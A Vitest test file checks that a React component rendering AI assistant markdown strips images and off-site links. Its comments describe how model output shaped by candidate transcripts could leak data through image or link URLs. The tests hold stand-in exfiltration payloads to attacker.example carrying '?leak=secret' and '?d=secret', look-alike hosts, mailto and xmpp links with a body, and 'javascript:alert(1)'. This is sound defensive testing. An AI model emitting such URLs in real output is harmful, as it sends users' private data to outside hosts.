// @vitest-environment node
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { I18nextProvider } from 'react-i18next'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import { MessageResponse } from './message'
import type { Locale } from '~/lib/locale'
import { createI18n } from '~/lib/i18n'

/**
 * Assistant output is model output, and the model reads candidate transcripts
 * through `readReport`. An image in it is a request the recruiter's browser
 * makes on render, with whatever the model put in the URL — so no image the
 * model names may be loaded, whatever form it takes.
 */
function render(markdown: string, locale: Locale = 'en'): string {
  return renderToStaticMarkup(
    createElement(
      I18nextProvider,
      { i18n: createI18n(locale) },
      createElement(MessageResponse, { mode: 'static' }, markdown),
    ),
  )
}

const FOREIGN = 'https://attacker.example/p.png?leak=secret'

describe('MessageResponse images', () => {
  it.each([
    ['markdown image', `![chart](${FOREIGN})`],
    ['raw HTML image', `<img src="${FOREIGN}" alt="chart">`],
    ['reference image', `![chart][ref]\n\n[ref]: ${FOREIGN}`],
    // A <source> is only ever read by the <img> beside it: with the <img>
    // gone, the <picture> fetches nothing.
    [
      'picture',
      `<picture><source srcset="${FOREIGN}"><img src="${FOREIGN}" alt="chart"></picture>`,
    ],
  ])('never loads a %s', (_, markdown) => {
    const html = render(markdown)
    expect(html).not.toContain('<img')
    expect(html).not.toContain('rel="preload"')
    expect(html).not.toContain(' src=')
    expect(html).toContain('chart')
  })

  it('never loads a data: image', () => {
    const html = render('![pixel](data:image/png;base64,iVBORw0KGgo=)')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('data:image')
  })

  it('says, in the reader’s language, that an image was not shown', () => {
    expect(render(`![chart](${FOREIGN})`, 'en')).toContain('Image not shown')
    expect(render(`![chart](${FOREIGN})`, 'fr')).toContain('Image non affichée')
  })

})

/**
 * Audit 2026-09-22, lead 5. A link is a URL the model chose, and a click
 * hands it — query string included — to the host it names. Links lead into
 * the app and nowhere else; anything else keeps its text and loses its href.
 */
describe('MessageResponse links', () => {
  const APP = 'https://app.example'

  beforeEach(() => {
    vi.stubGlobal('window', { location: { origin: APP } })
  })
  afterEach(() => {
    vi.unstubAllGlobals()
  })

  function hrefs(html: string): Array<string> {
    return [...html.matchAll(/href="([^"]*)"/g)].map((m) => m[1])
  }

  it.each([
    ['an absolute link to the app', `${APP}/app/acme/projects`],
    ['a path inside the app', '/app/acme/projects'],
  ])('keeps %s', (_, url) => {
    const html = render(`[the roles](${url})`)
    expect(hrefs(html)).toHaveLength(1)
    expect(new URL(hrefs(html)[0], APP).origin).toBe(APP)
    expect(html).toContain('the roles')
  })

  it.each([
    ['an https link', 'https://attacker.example/?d=secret'],
    ['a look-alike host', 'https://app.example.attacker.example/?d=secret'],
    ['a protocol-relative link', '//attacker.example/?d=secret'],
    ['a raw HTML link', '<a href="https://attacker.example/?d=secret">x</a>'],
    ['a mailto: link', 'mailto:someone@attacker.example?body=secret'],
    ['an xmpp: link', 'xmpp:someone@attacker.example?message;body=secret'],
    ['a javascript: link', 'javascript:alert(1)'],
  ])('keeps the text of %s, never its href', (_, url) => {
    const markdown = url.startsWith('<') ? url : `[the link](${url})`
    const html = render(markdown)
    expect(hrefs(html)).toEqual([])
    expect(html).not.toContain('attacker.example')
    expect(html).not.toContain('javascript:')
    expect(html).not.toContain('data-streamdown="link"')
  })

  it('keeps no link at all when rendered without a window', () => {
    vi.unstubAllGlobals()
    expect(hrefs(render(`[the roles](${APP}/app)`))).toEqual([])
  })
})
